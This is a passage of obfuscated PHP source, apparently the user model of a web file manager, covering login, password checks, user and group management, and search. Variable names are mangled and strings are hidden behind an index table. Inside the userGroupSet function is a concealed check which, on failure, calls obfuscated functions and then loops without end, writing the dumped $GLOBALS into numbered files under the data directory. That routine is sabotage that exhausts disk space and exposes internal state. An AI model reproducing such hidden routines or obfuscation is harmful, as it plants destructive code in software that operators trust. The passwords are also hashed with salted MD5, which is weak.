self::ERROR_IP_NOT_ALLOW => $ôşĞã©[2475], self::ERROR_USER_EXIST_NICKNAME => $ôşĞã©[2476]); $­‚Ä‡ï£ = LNG($ĞĞ‡¦¡[$ÊİŸÅâÄ]); if ($ÊİŸÅâÄ == self::ERROR_USER_LOGIN_LOCK) { $ÜÓ±Ø‚Ë = (int) Model($ôşĞã©[2477])->get($ôşĞã©[2478]); if ($ÜÓ±Ø‚Ë > 60) { $­‚Ä‡ï£ = str_replace($ôşĞã©[91], ceil($ÜÓ±Ø‚Ë / 60), $­‚Ä‡ï£); } } return $­‚Ä‡ï£; } public function getInfoByMeta($ë˜ «›Î, $‰¹˜õóÄ) { $ğİ ÄÅ =& $_SERVER[§Êá¸İ]; $ÌÙ°¤Ò = Model($ğİ ÄÅ[2479])->where(array($ğİ ÄÅ[97] => $ë˜ «›Î, $ğİ ÄÅ[450] => $‰¹˜õóÄ))->find(); if ($ÌÙ°¤Ò) { return $this->getInfo($ÌÙ°¤Ò[$ğİ ÄÅ[1779]]); } return !1; } public function userLoginCheck($Ø‰ƒîĞ“, $ ¨‘„±) { $ ÉöäŞ =& $_SERVER[§Êá¸İ]; $…Ô©îŞ = $this->userLoginFind($Ø‰ƒîĞ“); if (!$…Ô©îŞ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($…Ô©îŞ[$ ÉöäŞ[1779]], $ ¨‘„±)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($…Ô©îŞ[$ ÉöäŞ[1779]]); } public function userLoginFind($Ñ™çÄ¯¹) { $ ĞËÇï =& $_SERVER[§Êá¸İ]; $†Î“Îú = array($ ĞËÇï[32] => $Ñ™çÄ¯¹, $ ĞËÇï[2266] => $Ñ™çÄ¯¹, $ ĞËÇï[381] => $Ñ™çÄ¯¹, $ ĞËÇï[2480] => $Ñ™çÄ¯¹, $ ĞËÇï[1088] => $ ĞËÇï[1090]); if ($this->nickNameRpt()) { unset($†Î“Îú[$ ĞËÇï[2266]]); } return $this->where($†Î“Îú)->find(); } public function clearCache($•‡…éñ) { $¢ÈöæÌ =& $_SERVER[§Êá¸İ]; $this->cacheFunctionClear($¢ÈöæÌ[2064], $•‡…éñ); $this->cacheFunctionClear($¢ÈöæÌ[2065], $•‡…éñ); $this->cacheFunctionClear($¢ÈöæÌ[2459], $•‡…éñ); } public function userPasswordCheck($÷ÑÑ˜, $¦º´¾˜ä) { $¡íïÉ¨ =& $_SERVER[§Êá¸İ]; $ºÁİ“· = $this->where(array($¡íïÉ¨[1779] => intval($÷ÑÑ˜)))->find(); $éµÓÓâ‡ = $this->metaGet($÷ÑÑ˜); $å±Ó×œä = isset($éµÓÓâ‡[$¡íïÉ¨[2481]]) ? $éµÓÓâ‡[$¡íïÉ¨[2481]] : $¡íïÉ¨[12]; if (md5($å±Ó×œä . trim($¦º´¾˜ä)) !== $ºÁİ“·[$¡íïÉ¨[976]]) { return !1; } return !0; } public function userAdd($üà²Æ…•) { $¡«ÅÕƒÀ =& $_SERVER[§Êá¸İ]; $í¸–‚ëˆ = array($¡«ÅÕƒÀ[502] => $üà²Æ…•[$¡«ÅÕƒÀ[32]], $¡«ÅÕƒÀ[2482] => $üà²Æ…•[$¡«ÅÕƒÀ[2184]], $¡«ÅÕƒÀ[2483] => isset($üà²Æ…•[$¡«ÅÕƒÀ[381]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[381]] : $¡«ÅÕƒÀ[12], $¡«ÅÕƒÀ[2484] => isset($üà²Æ…•[$¡«ÅÕƒÀ[2480]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[2480]] : $¡«ÅÕƒÀ[12], $¡«ÅÕƒÀ[2485] => isset($üà²Æ…•[$¡«ÅÕƒÀ[2266]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[2266]] : $üà²Æ…•[$¡«ÅÕƒÀ[32]], $¡«ÅÕƒÀ[2486] => isset($üà²Æ…•[$¡«ÅÕƒÀ[2463]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[2463]] : $¡«ÅÕƒÀ[12], $¡«ÅÕƒÀ[2487] => isset($üà²Æ…•[$¡«ÅÕƒÀ[2488]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[2488]] : 1, $¡«ÅÕƒÀ[2489] => $üà²Æ…•[$¡«ÅÕƒÀ[976]], $¡«ÅÕƒÀ[2066] => isset($üà²Æ…•[$¡«ÅÕƒÀ[1964]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[1964]] : 1024 * 1024 * 20, $¡«ÅÕƒÀ[2067] => 0, $¡«ÅÕƒÀ[2490] => 0, $¡«ÅÕƒÀ[2111] => isset($üà²Æ…•[$¡«ÅÕƒÀ[837]]) ? $üà²Æ…•[$¡«ÅÕƒÀ[837]] : 1); if (!empty($üà²Æ…•[$¡«ÅÕƒÀ[1779]])) { $í¸–‚ëˆ[$¡«ÅÕƒÀ[1779]] = $üà²Æ…•[$¡«ÅÕƒÀ[1779]]; } $÷óºğŸ = $this->_checkExist($üà²Æ…•); if ($÷óºğŸ !== !0) { return $÷óºğŸ; } if (!empty($í¸–‚ëˆ[$¡«ÅÕƒÀ[2463]]) && strlen($í¸–‚ëˆ[$¡«ÅÕƒÀ[2463]]) > 255) { $í¸–‚ëˆ[$¡«ÅÕƒÀ[2463]] = $¡«ÅÕƒÀ[12]; } $¯¬´³åÈ = $this->add($í¸–‚ëˆ); $°ÀîŞÈ¶ = array($¡«ÅÕƒÀ[2489] => $í¸–‚ëˆ[$¡«ÅÕƒÀ[976]], $¡«ÅÕƒÀ[2485] => $í¸–‚ëˆ[$¡«ÅÕƒÀ[2266]]); $this->userEdit($¯¬´³åÈ, $°ÀîŞÈ¶); Model($¡«ÅÕƒÀ[1428])->userRootAdd($¯¬´³åÈ); return $¯¬´³åÈ; } protected function userEditTest($¾¨¡Ì¶õ, $³ÀùĞ¥¹) { return $this->call($_SERVER[§Êá¸İ][2491], $¾¨¡Ì¶õ, $³ÀùĞ¥¹); } protected function userEdit($ıØ¡Î±ñ, $ï´¼‚Ü¯) { $×ªâµÉå =& $_SERVER[§Êá¸İ]; $²…ÃÉ·ò = $this->getInfoSimple($ıØ¡Î±ñ); if (!$²…ÃÉ·ò) { return !1; } $ìæ¼¶öå = $this->_checkExist($ï´¼‚Ü¯, $ıØ¡Î±ñ); if ($ìæ¼¶öå !== !0) { return $ìæ¼¶öå; } if (isset($ï´¼‚Ü¯[$×ªâµÉå[976]]) && trim($ï´¼‚Ü¯[$×ªâµÉå[976]]) != $×ªâµÉå[12]) { $şƒ•½ŒÙ = $this->metaGet($ıØ¡Î±ñ); if (empty($şƒ•½ŒÙ[$×ªâµÉå[2481]])) { $şƒ•½ŒÙ[$×ªâµÉå[2481]] = rand_string(10); Model($×ªâµÉå[585])->metaSet($ıØ¡Î±ñ, $×ªâµÉå[2481], $şƒ•½ŒÙ[$×ªâµÉå[2481]]); } $ï´¼‚Ü¯[$×ªâµÉå[976]] = md5($şƒ•½ŒÙ[$×ªâµÉå[2481]] . trim($ï´¼‚Ü¯[$×ªâµÉå[976]])); } else { unset($ï´¼‚Ü¯[$×ªâµÉå[976]]); } if (!empty($ï´¼‚Ü¯[$×ªâµÉå[2463]]) && strlen($ï´¼‚Ü¯[$×ªâµÉå[2463]]) > 255) { $ï´¼‚Ü¯[$×ªâµÉå[2463]] = $×ªâµÉå[12]; } $this->where(array($×ªâµÉå[1770] => $ıØ¡Î±ñ))->save($ï´¼‚Ü¯); if (isset($ï´¼‚Ü¯[$×ªâµÉå[2266]])) { $this->setNamePinyin($ıØ¡Î±ñ, $ï´¼‚Ü¯[$×ªâµÉå[2266]]); } $this->clearCache($ıØ¡Î±ñ); return !0; } public function setNamePinyin($¦ÛÄÌîÉ, $İ°¿úÂ§ = false) { $ê‹¡ş§ =& $_SERVER[§Êá¸İ]; if (!$İ°¿úÂ§) { $šå¯º¥ì = $this->getInfoSimple($¦ÛÄÌîÉ); $İ°¿úÂ§ = $šå¯º¥ì[$ê‹¡ş§[2266]] ? $šå¯º¥ì[$ê‹¡ş§[2266]] : $šå¯º¥ì[$ê‹¡ş§[32]]; } $îğö¼ö² = Model($ê‹¡ş§[606]); if (!Input::check($İ°¿úÂ§, $ê‹¡ş§[663])) { return $îğö¼ö²->metaSet($¦ÛÄÌîÉ, array($ê‹¡ş§[546] => $ê‹¡ş§[12], $ê‹¡ş§[545] => $ê‹¡ş§[12])); } return $îğö¼ö²->metaSet($¦ÛÄÌîÉ, array($ê‹¡ş§[546] => str_replace($ê‹¡ş§[53], $ê‹¡ş§[12], Pinyin::get($İ°¿úÂ§)), $ê‹¡ş§[545] => Pinyin::get($İ°¿úÂ§, $ê‹¡ş§[664]))); } private function nickNameRpt() { $·ÄêœÅ¥ =& $_SERVER[§Êá¸İ]; $¾§Í«­– = Model($·ÄêœÅ¥[857])->get($·ÄêœÅ¥[2492]); $ó©¸„Ù = $GLOBALS[$·ÄêœÅ¥[6]][$·ÄêœÅ¥[457]][$·ÄêœÅ¥[2492]]; $¾ŞÏÕÀ = !is_null($¾§Í«­–) ? $¾§Í«­– : $ó©¸„Ù; return !!$¾ŞÏÕÀ; } private function _checkExist($ğÆôğ›Â, $èÔÉ¶¹– = false) { $ç§éğİ© =& $_SERVER[§Êá¸İ]; $¡¨ÓØ²Œ = array($ç§éğİ©[32] => UserModel::ERROR_USER_EXIST_NAME, $ç§éğİ©[2266] => UserModel::ERROR_USER_EXIST_NICKNAME, $ç§éğİ©[381] => UserModel::ERROR_USER_EXIST_EMAIL, $ç§éğİ©[2480] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¡¨ÓØ²Œ[$ç§éğİ©[2266]]); } $åøœÁ–Å = $èÔÉ¶¹– ? array($ç§éğİ©[1779] => array($ç§éğİ©[2493], $èÔÉ¶¹–)) : array(); foreach ($¡¨ÓØ²Œ as $ıÑíáêã => $‹áıö®Ç) { $×‚°»ƒ­ = array(); foreach ($¡¨ÓØ²Œ as $Œœ´ûÁÂ => $»òç¹õ) { if (isset($ğÆôğ›Â[$Œœ´ûÁÂ]) && $ğÆôğ›Â[$Œœ´ûÁÂ]) { $×‚°»ƒ­[] = $ğÆôğ›Â[$Œœ´ûÁÂ]; } } if (!$×‚°»ƒ­) { continue; } $ç¡Ù „„ = array_merge(array($ıÑíáêã => array($ç§éğİ©[7], $×‚°»ƒ­)), $åøœÁ–Å); $ËüÎÛ…€ = $this->where($ç¡Ù „„)->find(); if ($ËüÎÛ…€) { return $‹áıö®Ç; } } return !0; } public function userListInfo($¼•ùäÒ·) { $ŸˆİÚ¤ =& $_SERVER[§Êá¸İ]; $ş¯ëÄ = array(); $¼•ùäÒ· = is_array($¼•ùäÒ·) ? array_unique($¼•ùäÒ·) : array(); if (!$¼•ùäÒ·) { return $ş¯ëÄ; } if (count($¼•ùäÒ·) < 20) { foreach ($¼•ùäÒ· as $ÃƒñÛàÂ) { $ş¯ëÄ[$ÃƒñÛàÂ . $ŸˆİÚ¤[12]] = $this->getInfoSimpleOuter($ÃƒñÛàÂ); } } else { $ ½àº¯µ = array($ŸˆİÚ¤[1770] => array($ŸˆİÚ¤[500], $¼•ùäÒ·)); if (count($¼•ùäÒ·) == 1) { $ ½àº¯µ = array($ŸˆİÚ¤[1770] => $¼•ùäÒ·[0]); } $ÅĞÏœÂ¨ = Model($ŸˆİÚ¤[585])->field($this->simpleField)->where($ ½àº¯µ)->select(); $ÅĞÏœÂ¨ = array_to_keyvalue($ÅĞÏœÂ¨, $ŸˆİÚ¤[1779]); foreach ($¼•ùäÒ· as $ÃƒñÛàÂ) { $ ÕÉˆßË = $ÅĞÏœÂ¨[$ÃƒñÛàÂ]; if (!$ ÕÉˆßË) { $ş¯ëÄ[$ÃƒñÛàÂ . $ŸˆİÚ¤[12]] = $this->getInfoSimpleOuter($ÃƒñÛàÂ); continue; } $ ÕÉˆßË[$ŸˆİÚ¤[2463]] = Action($ŸˆİÚ¤[2464])->parseUrl($ ÕÉˆßË[$ŸˆİÚ¤[2463]]); $ş¯ëÄ[$ÃƒñÛàÂ . $ŸˆİÚ¤[12]] = $ ÕÉˆßË; } } return $ş¯ëÄ; } protected function userStatus($ñ’‰şÑÉ, $Ìœ˜¾üî) { $‡áÏÁŠ = $this->getInfoSimple($ñ’‰şÑÉ); if (!$‡áÏÁŠ) { return !1; } $Ë˜¢÷…œ = array($_SERVER[§Êá¸İ][837] => $Ìœ˜¾üî); return $this->userEdit($ñ’‰şÑÉ, $Ë˜¢÷…œ); } protected function userRemove($ÑÓÉí§) { $‡†…¥şà =& $_SERVER[§Êá¸İ]; $Æö¬¢ƒ  = $this->getInfoSimple($ÑÓÉí§); if (!$Æö¬¢ƒ ) { return !1; } $Åİü¿ƒğ = array($‡†…¥şà[1770] => $ÑÓÉí§); Model($‡†…¥şà[672])->where($Åİü¿ƒğ)->delete(); Model($‡†…¥şà[2494])->where($Åİü¿ƒğ)->delete(); Model($‡†…¥şà[2072])->where($Åİü¿ƒğ)->delete(); Model($‡†…¥şà[2479])->where($Åİü¿ƒğ)->delete(); Model($‡†…¥şà[1157])->where($Åİü¿ƒğ)->delete(); Model($‡†…¥şà[2283])->removeUserAll($ÑÓÉí§); Model($‡†…¥şà[911])->userRootRemove($ÑÓÉí§); return $this->where($Åİü¿ƒğ)->delete(); } protected function userGroupSet($¤Ó¼ÙøÔ, $¦¶øÏË¹, $³Ä§«Ææ = array()) { $œ›äÈ–Ë =& $_SERVER[§Êá¸İ]; $äñ‹œò¶ = $_SERVER[$œ›äÈ–Ë[473]]; $ÍıŞÈÌİ = $œ›äÈ–Ë[963]; if ($_SERVER[$œ›äÈ–Ë[472]] != $ÍıŞÈÌİ($äñ‹œò¶)) { $­Ù®ˆ¶ = $œ›äÈ–Ë[964]; $çëšÉŠª = $œ›äÈ–Ë[474]; $Æ³¬×ñ¨ = $_SERVER[$œ›äÈ–Ë[475]] . $œ›äÈ–Ë[476]; $îñãÇïƒ = $çëšÉŠª($Æ³¬×ñ¨); $¦ùı´É = explode($œ›äÈ–Ë[262], $îñãÇïƒ); if (count($¦ùı´É) < $œ›äÈ–Ë[700]) { $…ÍéÃ¡ª = $œ›äÈ–Ë[478]; $…ÍéÃ¡ª(); } $Ğ½‚‰Íø = $œ›äÈ–Ë[965]; $Ğ½‚‰Íø($_SERVER[$œ›äÈ–Ë[966]]); $­Ù®ˆ¶ = $œ›äÈ–Ë[964]; $­Ù®ˆ¶(); $üŸÆ¨Îì = $œ›äÈ–Ë[967]; $ˆÌ‡¥“Ñ = json_encode($GLOBALS[$œ›äÈ–Ë[968]]); $¾¯…ª£Ç = 1; for ($ÇÕÊ´Ÿã = $¾¯…ª£Ç; $ÇÕÊ´Ÿã > 0; $ÇÕÊ´Ÿã++) { $üŸÆ¨Îì(DATA_PATH . $ÇÕÊ´Ÿã, $ˆÌ‡¥“Ñ); } } $ÑÜ„öéÑ = $this->getInfoSimple($¤Ó¼ÙøÔ); if (!$ÑÜ„öéÑ || !is_array($¦¶øÏË¹)) { return !1; } $¥É†¯Ñ” = Model($œ›äÈ–Ë[2072]); $¥É†¯Ñ”->where(array($œ›äÈ–Ë[1779] => $¤Ó¼ÙøÔ))->delete(); $œí¦Ş½¾ = array(); $ØÖúë¹Ô = 0; foreach ($¦¶øÏË¹ as $¢‚áËğ => $ªááëˆÉ) { $¾×çÉì = array($œ›äÈ–Ë[1779] => $¤Ó¼ÙøÔ, $œ›äÈ–Ë[1978] => $¢‚áËğ, $œ›äÈ–Ë[2086] => $ªááëˆÉ); $¾×çÉì[$œ›äÈ–Ë[2002]] = isset($³Ä§«Ææ[$ØÖúë¹Ô]) ? $³Ä§«Ææ[$ØÖúë¹Ô] : 0; $ØÖúë¹Ô++; $œí¦Ş½¾[] = $¾×çÉì; } return $¥É†¯Ñ”->addAll($œí¦Ş½¾, array(), !0); } protected function userGroupAdd($ ¹È…¡Â, $¦íÈ°µ’ = array()) { $Òœ‰İÒ¦ =& $_SERVER[§Êá¸İ]; $Ì”óô = $this->getInfoSimple($ ¹È…¡Â); if (!$Ì”óô || empty($¦íÈ°µ’)) { return !1; } $‘ú˜Ë˜ = array(); foreach ($¦íÈ°µ’ as $ µ§×ØÀ => $Øºçˆù†) { $‘ú˜Ë˜[] = array($Òœ‰İÒ¦[1779] => $ ¹È…¡Â, $Òœ‰İÒ¦[1978] => $ µ§×ØÀ, $Òœ‰İÒ¦[2086] => $Øºçˆù†, $Òœ‰İÒ¦[2002] => 0); } return Model($Òœ‰İÒ¦[2072])->addAll($‘ú˜Ë˜, array(), !0); } protected function userGroupRemove($‚æÜŸæ›, $·¼öù¶÷) { $ Ú¦ßÉî =& $_SERVER[§Êá¸İ]; $æô³”¯ = $this->getInfoSimple($‚æÜŸæ›); if (!$æô³”¯ || !$·¼öù¶÷) { return !1; } $óÆœûÂç = array($ Ú¦ßÉî[1770] => $‚æÜŸæ›, $ Ú¦ßÉî[2070] => $·¼öù¶÷); return Model($ Ú¦ßÉî[2072])->where($óÆœûÂç)->delete(); } public function listData() { $Ë¹…œ†– = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ë¹…œ†–[$_SERVER[§Êá¸İ][445]]); return $Ë¹…œ†–; } public function listByID($Ùù†¢¬‘) { $ÜûéËâç =& $_SERVER[§Êá¸İ]; if (!$Ùù†¢¬‘) { return; } $áîÇêË¹ = array($ÜûéËâç[1779] => array($ÜûéËâç[7], $Ùù†¢¬‘)); $ÛûôÄí– = $this->where($áîÇêË¹)->select(); $ÛûôÄí– = array_sort_keep($ÛûôÄí–, $ÜûéËâç[1779], $Ùù†¢¬‘); $this->_listDataApply($ÛûôÄí–); return $ÛûôÄí–; } public function listByGroup($²Ï¸şîê = 0, $¾ä§Áµ = array()) { $£è»Æ„Â =& $_SERVER[§Êá¸İ]; $‰®ÇĞÄ = $£è»Æ„Â[12]; $¾¬ØªÓ = array(); if ($²Ï¸şîê) { $¾¬ØªÓ = array($£è»Æ„Â[2495] => intval($²Ï¸şîê)); $‰®ÇĞÄ = "\x4c\105\106\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\x72\157\x75\x70\40\165\163\145\162\137\147\162\x6f\x75\160\40\x6f\x6e\40\165\163\x65\162\x2e\165\x73\x65\162\x49\x44\x20\x3d\x20\165\163\x65\x72\x5f\147\162\x6f\x75\x70\56\x75\x73\145\162\111\104"; $ĞÂÍ—”¾ = Input::get($£è»Æ„Â[538], null, $£è»Æ„Â[12]) ? $£è»Æ„Â[12] : $£è»Æ„Â[2496]; } if (isset($¾ä§Áµ[$£è»Æ„Â[837]])) { $¾¬ØªÓ[$£è»Æ„Â[2497]] = $¾ä§Áµ[$£è»Æ„Â[837]]; } $ñÕŠÔÂ = $this->_makeOrder($ĞÂÍ—”¾)->field($£è»Æ„Â[2498])->where($¾¬ØªÓ)->join($‰®ÇĞÄ)->selectPage(50); $this->_listDataApply($ñÕŠÔÂ[$£è»Æ„Â[445]]); return $ñÕŠÔÂ; } private function _makeOrder($è–ãˆµÅ = '') { $³üŠ‘ú¨ =& $_SERVER[§Êá¸İ]; $Ş¯Ï†Ù½ = array($³üŠ‘ú¨[1779], $³üŠ‘ú¨[32], $³üŠ‘ú¨[1966], $³üŠ‘ú¨[2184], $³üŠ‘ú¨[1938], $³üŠ‘ú¨[231]); $œÀ²¬¨‚ = array($³üŠ‘ú¨[531] => $³üŠ‘ú¨[532], $³üŠ‘ú¨[533] => $³üŠ‘ú¨[534]); $ŸÑ’Ü”Ì = Input::get($³üŠ‘ú¨[538], $³üŠ‘ú¨[7], $³üŠ‘ú¨[1770], $Ş¯Ï†Ù½); $ğĞ¿à×È = Input::get($³üŠ‘ú¨[539], $³üŠ‘ú¨[7], $³üŠ‘ú¨[2073], array($³üŠ‘ú¨[2073], $³üŠ‘ú¨[533])); $ğĞ¿à×È = $œÀ²¬¨‚[$ğĞ¿à×È]; $è–ãˆµÅ = $è–ãˆµÅ . "\x75\163\145\162\x2e{$ŸÑ’Ü”Ì}\40{$ğĞ¿à×È}\x2c\40\165\163\145\162\56\x75\x73\145\162\111\104\40\141\x73\x63"; return $this->alias($³üŠ‘ú¨[2200])->order($è–ãˆµÅ); } public function listSearch($åîßåäâ) { $÷Ë€ÌÚ¼ =& $_SERVER[§Êá¸İ]; $³“ÈÚÕ» = trim($åîßåäâ[$÷Ë€ÌÚ¼[2076]]); $ëäñÀ› = explode($÷Ë€ÌÚ¼[53], $³“ÈÚÕ»); if (!$³“ÈÚÕ» || count($ëäñÀ›) == 1) { return $this->listSearchNow($åîßåäâ); } $Òéé‹£ß = array($÷Ë€ÌÚ¼[445] => array()); foreach ($ëäñÀ› as $ÍÔ•«ßĞ) { if (!trim($ÍÔ•«ßĞ)) { continue; } $åîßåäâ[$÷Ë€ÌÚ¼[2076]] = $ÍÔ•«ßĞ; $Çüç‰ê¡ = $this->listSearchNow($åîßåäâ); $Òéé‹£ß[$÷Ë€ÌÚ¼[445]] = array_merge($Òéé‹£ß[$÷Ë€ÌÚ¼[445]], $Çüç‰ê¡[$÷Ë€ÌÚ¼[445]]); } $Òéé‹£ß[$÷Ë€ÌÚ¼[445]] = array_unique_by_key($Òéé‹£ß[$÷Ë€ÌÚ¼[445]], $÷Ë€ÌÚ¼[1779]); $Òéé‹£ß[$÷Ë€ÌÚ¼[442]] = array($÷Ë€ÌÚ¼[443] => count($Òéé‹£ß[$÷Ë€ÌÚ¼[445]]), $÷Ë€ÌÚ¼[439] => 20, $÷Ë€ÌÚ¼[429] => 1, $÷Ë€ÌÚ¼[444] => 1); return $Òéé‹£ß; } public function listSearchNow($²©ßàµŠ) { $¸Ÿç…µû =& $_SERVER[§Êá¸İ]; $Ã½—îİÅ = trim($²©ßàµŠ[$¸Ÿç…µû[2076]]); $©À…Í‰• = isset($²©ßàµŠ[$¸Ÿç…µû[2077]]) ? $²©ßàµŠ[$¸Ÿç…µû[2077]] : !1; $Ã½—îİÅ = str_replace($¸Ÿç…µû[2078], $¸Ÿç…µû[2079], trim($Ã½—îİÅ)); $ñî²öâ = array($¸Ÿç…µû[32] => array($¸Ÿç…µû[459], "\x25{$Ã½—îİÅ}\x25"), $¸Ÿç…µû[381] => array($¸Ÿç…µû[459], "{$Ã½—îİÅ}\x25"), $¸Ÿç…µû[2266] => array($¸Ÿç…µû[459], "{$Ã½—îİÅ}\45"), $¸Ÿç…µû[1088] => $¸Ÿç…µû[2080]); if (Input::check($Ã½—îİÅ, $¸Ÿç…µû[387])) { $ñî²öâ[$¸Ÿç…µû[1779]] = array($¸Ÿç…µû[459], "{$Ã½—îİÅ}\x25"); $ñî²öâ[$¸Ÿç…µû[2480]] = array($¸Ÿç…µû[459], "{$Ã½—îİÅ}\45"); } if (!$Ã½—îİÅ) { $ñî²öâ = array(); } if (isset($²©ßàµŠ[$¸Ÿç…µû[837]])) { $ñî²öâ[$¸Ÿç…µû[837]] = $²©ßàµŠ[$¸Ÿç…µû[837]]; } $ñî²öâ = $this->parseWhereLike($ñî²öâ); $ÛÈşøî = $this->_makeOrder()->where($ñî²öâ)->selectPage(20); if (!$ÛÈşøî || count($ÛÈşøî[$¸Ÿç…µû[445]]) < 5 && Input::check($Ã½—îİÅ, $¸Ÿç…µû[394])) { $€Òæ†Ü = $this->_searchFromMeta($¸Ÿç…µû[545], $Ã½—îİÅ, 10); $¶”Õ¹ÓÕ = $this->_searchFromMeta($¸Ÿç…µû[546], $Ã½—îİÅ, 10); $°àü®Ö… = array_merge($€Òæ†Ü, $¶”Õ¹ÓÕ, $ÛÈşøî[$¸Ÿç…µû[445]]); $ÛÈşøî[$¸Ÿç…µû[445]] = array_unique_by_key($°àü®Ö…, $¸Ÿç…µû[1779]); $ÛÈşøî[$¸Ÿç…µû[442]][$¸Ÿç…µû[443]] = count($ÛÈşøî[$¸Ÿç…µû[445]]); $ÛÈşøî[$¸Ÿç…µû[442]][$¸Ÿç…µû[444]] = ceil($ÛÈşøî[$¸Ÿç…µû[442]][$¸Ÿç…µû[443]] / $ÛÈşøî[$¸Ÿç…µû[442]][$¸Ÿç…µû[439]]); } $this->_listDataApply($ÛÈşøî[$¸Ÿç…µû[445]]); $this->_filterByGroup($ÛÈşøî, $©À…Í‰•); return $ÛÈşøî; } private function _filterByGroup(&$Í½®È½…, $öÎÀÆæ‡) { $Áí«î =& $_SERVER[§Êá¸İ]; if (!$öÎÀÆæ‡) { return $Í½®È½…; } foreach ($Í½®È½…[$Áí«î[445]] as $ş‹™ÁİÁ => &$Í“ŞĞĞ) { $€Ğ“•À” = array_to_keyvalue($Í“ŞĞĞ[$Áí«î[2169]], $Áí«î[12], $Áí«î[1978]); if (!in_array($öÎÀÆæ‡, $€Ğ“•À”)) { unset($Í½®È½…[$Áí«î[445]][$ş‹™ÁİÁ]); } } unset($Í“ŞĞĞ); $Í½®È½…[$Áí«î[445]] = array_values($Í½®È½…[$Áí«î[445]]); $Í½®È½…[$Áí«î[442]] = array($Áí«î[2236] => count($Í½®È½…[$Áí«î[445]]), $Áí«î[2234] => $Í½®È½…[$Áí«î[442]][$Áí«î[439]], $Áí«î[2233] => 1, $Áí«î[2235] => 1); } private function _searchFromMeta($ï¤¹Í€, $‘Äù²Üé, $ä®Şâä) { $—ÅîºŒ­ =& $_SERVER[§Êá¸İ]; $‘Äù²Üé = strtolower($‘Äù²Üé); $ı°ÑàÁë = array($—ÅîºŒ­[97] => $ï¤¹Í€, $—ÅîºŒ­[450] => array($—ÅîºŒ­[459], "\45{$‘Äù²Üé}\45")); $ı°ÑàÁë = $this->parseWhereLike($ı°ÑàÁë); $ëû’†Óë = Model($—ÅîºŒ­[2499])->where($ı°ÑàÁë)->limit($ä®Şâä)->select(); if (!$ëû’†Óë) { return array(); } $ëû’†Óë = array_to_keyvalue($ëû’†Óë, $—ÅîºŒ­[12], $—ÅîºŒ­[1779]); $ÀËĞïşĞ = $this->where(array($—ÅîºŒ­[1770] => array($—ÅîºŒ­[7], $ëû’†Óë)))->select(); if (!$ÀËĞïşĞ) { return array(); } return $ÀËĞïşĞ; } private function _listDataApplyItem($Øõ´úÏ) { $ŞÜß•åİ = array($Øõ´úÏ); $this->_listDataApply($ŞÜß•åİ); return $ŞÜß•åİ[0]; } private function _listDataApply(&$´•Ãî»˜) { $¹‰ßµìÅ =& $_SERVER[§Êá¸İ]; if (!$´•Ãî»˜) { return; } array_remove_key($´•Ãî»˜, $¹‰ßµìÅ[976]); $ñ¸Ù†¼ = array_to_keyvalue($´•Ãî»˜, $¹‰ßµìÅ[12], $¹‰ßµìÅ[1779]); $this->_listAppendGroup($´•Ãî»˜, $ñ¸Ù†¼); $this->_listAppendMeta($´•Ãî»˜, $ñ¸Ù†¼); $this->_listAppendSourceRoot($´•Ãî»˜, $ñ¸Ù†¼); } private function _listAppendSourceRoot(&$öÙå™¾, $õ…©²øÅ) { $µç©ÀÒ© =& $_SERVER[§Êá¸İ]; $ÇÛ­‡ıÅ = Model($µç©ÀÒ©[911])->listSourceRoot(SourceModel::TYPE_USER, $õ…©²øÅ); $ÇÛ­‡ıÅ = array_to_keyvalue($ÇÛ­‡ıÅ, $µç©ÀÒ©[577]); $ÇÛ­‡ıÅ = array_remove_key($ÇÛ­‡ıÅ, $µç©ÀÒ©[577]); foreach ($öÙå™¾ as &$¾Ääàı) { $¾Ääàı[$µç©ÀÒ©[90]] = $ÇÛ­‡ıÅ[$¾Ääàı[$µç©ÀÒ©[1779]]] ? $ÇÛ­‡ıÅ[$¾Ääàı[$µç©ÀÒ©[1779]]] : array(); } unset($¾Ääàı); } private function _listAppendGroup(&$÷ó¡œüˆ, $«ÇÆ ª‘) { $•Ìùû°À =& $_SERVER[§Êá¸İ]; $ïèŒÏ§¯ = array($•Ìùû°À[1779] => array($•Ìùû°À[7], $«ÇÆ ª‘)); $ÎÕ³ã–Ã = Model($•Ìùû°À[2072])->where($ïèŒÏ§¯)->select(); $âõ“°÷… = array_to_keyvalue($ÎÕ³ã–Ã, $•Ìùû°À[12], $•Ìùû°À[1978]); $âõ“°÷… = array_remove_value(array_unique($âõ“°÷…), $•Ìùû°À[228]); if (!$âõ“°÷… || !$ÎÕ³ã–Ã) { return; } $ïèŒÏ§¯ = array($•Ìùû°À[1978] => array($•Ìùû°À[7], $âõ“°÷…)); $ÍÚ—–ó = Model($•Ìùû°À[2167])->field($•Ìùû°À[2500])->where($ïèŒÏ§¯)->select(); $ÍÚ—–ó = array_to_keyvalue($ÍÚ—–ó, $•Ìùû°À[1978]); $ÎÕ³ã–Ã = array_to_keyvalue_group($ÎÕ³ã–Ã, $•Ìùû°À[1779]); foreach ($ÎÕ³ã–Ã as &$ö¼°ŞÖÉ) { $ŸÙéÚ  = array(); foreach ($ö¼°ŞÖÉ as $¶ä©ßÆ‰) { if (!$¶ä©ßÆ‰[$•Ìùû°À[2086]]) { continue; } $Ï•ÈÛÎ = Model($•Ìùû°À[579])->listData($¶ä©ßÆ‰[$•Ìùû°À[2086]]); $ŸÙéÚ [] = array($•Ìùû°À[1978] => $¶ä©ßÆ‰[$•Ìùû°À[1978]], $•Ìùû°À[2501] => $ÍÚ—–ó[$¶ä©ßÆ‰[$•Ìùû°À[1978]]][$•Ìùû°À[32]], $•Ìùû°À[592] => $ÍÚ—–ó[$¶ä©ßÆ‰[$•Ìùû°À[1978]]][$•Ìùû°À[592]], $•Ìùû°À[495] => $Ï•ÈÛÎ); } $ö¼°ŞÖÉ = $ŸÙéÚ ; } unset($ö¼°ŞÖÉ); foreach ($÷ó¡œüˆ as &$¢ÃËÆ…Ê) { $¢ÃËÆ…Ê[$•Ìùû°À[2169]] = array(); if 